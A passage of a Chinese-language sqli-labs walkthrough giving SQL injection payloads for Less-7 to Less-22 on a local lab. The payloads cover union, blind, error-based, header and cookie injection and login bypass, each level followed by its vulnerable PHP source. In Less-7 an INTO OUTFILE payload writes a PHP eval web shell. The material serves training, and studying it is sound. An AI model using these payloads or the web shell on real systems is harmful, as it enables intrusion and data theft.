class="comment">#测试是否存在注入</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-7/?id=1&#x27;)) <span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span>--+</span><br><span class="line"><span class="comment">#将user,2,3写入文件uuu.txt中</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-7/?id=1&#x27;))UNION SELECT user(),<span class="number">2</span>,<span class="number">3</span> into outfile <span class="string">&quot;E:\\xampp\\Xampp\\htdocs\\sqli-labs\\Less-7\\uuu.txt&quot;</span>--+</span><br><span class="line"><span class="comment">#将一句话木马写入进去</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-7/?id=1&#x27;))UNION SELECT <span class="string">&#x27;&lt;?php <span class="variable">@eval</span>(<span class="variable">$_POST</span>[&quot;attack&quot;])?&gt;&#x27;</span>,<span class="number">2</span>,<span class="number">3</span> into outfile <span class="string">&quot;E:\\xampp\\Xampp\\htdocs\\sqli-labs\\Less-7\\attack.php&quot;</span>--+</span><br></pre></td></tr></table></figure><h3 id="Less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注"><a href="#Less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注" class="headerlink" title="Less-8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)"></a>Less-8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)</h3><h4 id="手动注入-6"><a href="#手动注入-6" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#测试注入点</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-8/?id=1&#x27;<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span>--+</span><br><span class="line"><span class="comment">#布尔盲注</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-8/?id=1&#x27; and left(version(),<span class="number">15</span>)=<span class="string">&#x27;10.4.11-MariaDB&#x27;</span>--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-7"><a href="#源码分析-7" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//echo &#x27;You are in...........&#x27;;</span></span><br><span class="line"><span class="comment">//print_r(mysqli_error($con1));</span></span><br><span class="line"><span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关错误信息也不再回显，但可以通过是否出现<code>You are in...........</code>来实现布尔盲注。</p><h3 id="Less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注"><a href="#Less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注" class="headerlink" title="Less-9 GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)"></a>Less-9 GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)</h3><h4 id="手动注入-7"><a href="#手动注入-7" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#时间盲注</span></span><br><span class="line"><span class="comment">#猜测数据库security</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-9/?id=1&#x27;<span class="attribute">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-9/?id=1&#x27;and If(ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-8"><a href="#源码分析-8" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line"><span class="comment">//print_r(mysqli_error($con1));</span></span><br><span class="line"><span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注"><a href="#Less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注" class="headerlink" title="Less-10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)"></a>Less-10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)</h3><p>输入被用<code>&quot;&quot;</code>处理，其他与less-9相同。</p><h3 id="Less-11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入"><a href="#Less-11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入" class="headerlink" title="Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)"></a>Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)</h3><h4 id="手动注入-8"><a href="#手动注入-8" class="headerlink" title="手动注入"></a>手动注入</h4><p>post接收参数</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#万能，密码随意</span></span><br><span class="line">admin&#x27;<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"><span class="comment">#爆库名，密码随意</span></span><br><span class="line">1admin<span class="string">&#x27;union select 1,database()#</span></span><br></pre></td></tr></table></figure><h4 id="源码分析-9"><a href="#源码分析-9" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入"><a href="#Less-12-POST-Error-Based-Double-quotes-String-with-twist-基于错误的双引号POST型字符型变形的注入" class="headerlink" title="Less-12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)"></a>Less-12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)</h3><h4 id="手动注入-9"><a href="#手动注入-9" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#post传入</span></span><br><span class="line">uname=1&quot;)<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&amp;passwd=2</span></span><br></pre></td></tr></table></figure><h4 id="源码分析-10"><a href="#源码分析-10" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-13-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><a href="#Less-13-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入" class="headerlink" title="Less-13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)"></a>Less-13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</h3><h4 id="手动注入-10"><a href="#手动注入-10" class="headerlink" title="手动注入"></a>手动注入</h4><p>先用万能密码登录。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">uname=1&#x27;)<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&amp;passwd=2</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/j7OKIP4yh2SV8x5.png" alt="13.png"></p><p>登录成功后便可以使用布尔盲注爆库等信息。</p><h4 id="源码分析-11"><a href="#源码分析-11" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(&#x27;<span class="subst">$uname</span>&#x27;) and password=(&#x27;<span class="subst">$passwd</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><a href="#Less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入" class="headerlink" title="Less-14 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)"></a>Less-14 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</h3><h4 id="手动注入-11"><a href="#手动注入-11" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#万能密码</span></span><br><span class="line">admin&quot;<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"><span class="comment">#报错注入</span></span><br><span class="line">uname=admin<span class="string">&quot;and extractvalue(1,concat(0x7e,(select @<span class="variable">@version</span>),0x7e))#&amp;passwd=1&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/JoPmqcNLdfSwTi7.png" alt="14.png"></p><h4 id="源码分析-12"><a href="#源码分析-12" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=<span class="subst">$uname</span> and password=<span class="subst">$passwd</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="less-15-POST-Blind-Boolian-x2F-time-Based-Single-quotes-基于bool型-x2F-时间延迟单引号POST型盲注"><a href="#less-15-POST-Blind-Boolian-x2F-time-Based-Single-quotes-基于bool型-x2F-时间延迟单引号POST型盲注" class="headerlink" title="less-15 POST - Blind- Boolian&#x2F;time Based - Single quotes (基于bool型&#x2F;时间延迟单引号POST型盲注)"></a>less-15 POST - Blind- Boolian&#x2F;time Based - Single quotes (基于bool型&#x2F;时间延迟单引号POST型盲注)</h3><h4 id="手动注入-12"><a href="#手动注入-12" class="headerlink" title="手动注入"></a>手动注入</h4><p>使用延时注入，正确直接登录成功，否则延时5s。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">uname=admin&#x27;<span class="attribute">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))<span class="comment">#&amp;passwd=11&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h4 id="源码分析-13"><a href="#源码分析-13" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-16-POST-Blind-Boolian-x2F-Time-Based-Double-quotes-基于bool型-x2F-时间延迟的双引号POST型盲注"><a href="#Less-16-POST-Blind-Boolian-x2F-Time-Based-Double-quotes-基于bool型-x2F-时间延迟的双引号POST型盲注" class="headerlink" title="Less-16 POST - Blind- Boolian&#x2F;Time Based - Double quotes (基于bool型&#x2F;时间延迟的双引号POST型盲注)"></a>Less-16 POST - Blind- Boolian&#x2F;Time Based - Double quotes (基于bool型&#x2F;时间延迟的双引号POST型盲注)</h3><h4 id="手动注入-13"><a href="#手动注入-13" class="headerlink" title="手动注入"></a>手动注入</h4><p>使用延时注入，正确直接登录成功，否则延时5s。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">uname=admin&quot;)<span class="attribute">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))<span class="comment">#&amp;passwd=11&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h4 id="源码分析-14"><a href="#源码分析-14" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入"><a href="#Less-17-POST-Update-Query-Error-Based-String-基于错误的更新查询POST注入" class="headerlink" title="Less-17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)"></a>Less-17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)</h3><h4 id="手动注入-14"><a href="#手动注入-14" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#报错注入</span></span><br><span class="line">uname=admin&amp;passwd=11&#x27;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e))<span class="comment">#&amp;submit=Submit</span></span><br><span class="line"><span class="comment">#延时注入</span></span><br><span class="line">uname=admin&amp;passwd=<span class="number">11</span><span class="string">&#x27;and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h4 id="源码分析-15"><a href="#源码分析-15" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$uname</span>=<span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>在<code>less-17</code>的<code>check_input()</code>中，对 username 进行各种转义的处理，所以此处不能使用username进行注入。</p><h4 id="函数简介"><a href="#函数简介" class="headerlink" title="函数简介"></a>函数简介</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">addslashes</span>() <span class="comment">#函数返回在预定义字符之前添加反斜杠的字符串，如单引号（&#x27;），双引号（&quot;），反斜杠（\），NULL。</span></span><br><span class="line"><span class="title function_ invoke__">stripslashes</span>() <span class="comment">#函数删除由 addslashes() 函数添加的反斜杠。</span></span><br><span class="line"><span class="title function_ invoke__">mysql_real_escape_string</span>() <span class="comment">#函数转义 SQL 语句中使用的字符串中的特殊字符,如\x00，\n，\r，\，&#x27;，&quot;，\x1a。</span></span><br></pre></td></tr></table></figure><h3 id="Less-18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入"><a href="#Less-18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入" class="headerlink" title="Less-18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)"></a>Less-18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)</h3><h4 id="手动注入-15"><a href="#手动注入-15" class="headerlink" title="手动注入"></a>手动注入</h4><p>利用抓包工具修改<code>user-agent</code>即可</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e)) and <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/HklOqKTNYZFoMuD.png" alt="18_2.png"></p><h4 id="源码分析-16"><a href="#源码分析-16" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure><p>对 uname 和 passwd 进行了 check_input()函数的处理，所以我们在输入uname 和passwd上进行注入是不行的，但可以利用insert。</p><h3 id="Less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入"><a href="#Less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入" class="headerlink" title="Less-19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)"></a>Less-19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)</h3><h4 id="手动注入-16"><a href="#手动注入-16" class="headerlink" title="手动注入"></a>手动注入</h4><p>修改<code>referer</code>即可。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@basedir</span>),0x7e)) and <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><h4 id="源码分析-17"><a href="#源码分析-17" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入"><a href="#Less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入" class="headerlink" title="Less-20 POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)"></a>Less-20 POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)</h3><h4 id="手动注入-17"><a href="#手动注入-17" class="headerlink" title="手动注入"></a>手动注入</h4><p>添加<code>cookie</code>即可</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">uname=admin1&#x27;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@basedir</span>),0x7e))<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/VdL9Es5qwCboOKx.png" alt="20.png"></p><h4 id="源码分析-18"><a href="#源码分析-18" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="variable">$cookee</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure><h3 id="Less-21-Cookie-Injection-Error-Based-complex-string"><a href="#Less-21-Cookie-Injection-Error-Based-complex-string" class="headerlink" title="Less-21 Cookie Injection- Error Based- complex - string"></a>Less-21 Cookie Injection- Error Based- complex - string</h3><h4 id="手动注入-18"><a href="#手动注入-18" class="headerlink" title="手动注入"></a>手动注入</h4><p>对<code>Cookie</code>进行<code>base64</code>编码即可</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">Cookie：</span><br><span class="line">uname=YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2VkaXIpLDB4N2UpKSM=</span><br></pre></td></tr></table></figure><h4 id="源码分析-19"><a href="#源码分析-19" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))   <span class="comment">// Quote if not a number</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$value</span>) . <span class="string">&#x27;&quot;&#x27;</span>; <span class="comment">//添加了&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure><h3 id="Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入"><a href="#Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入" class="headerlink" title="Less-22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)"></a>Less-22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)</h3><h4 id="手动注入-19"><a href="#手动注入-19" 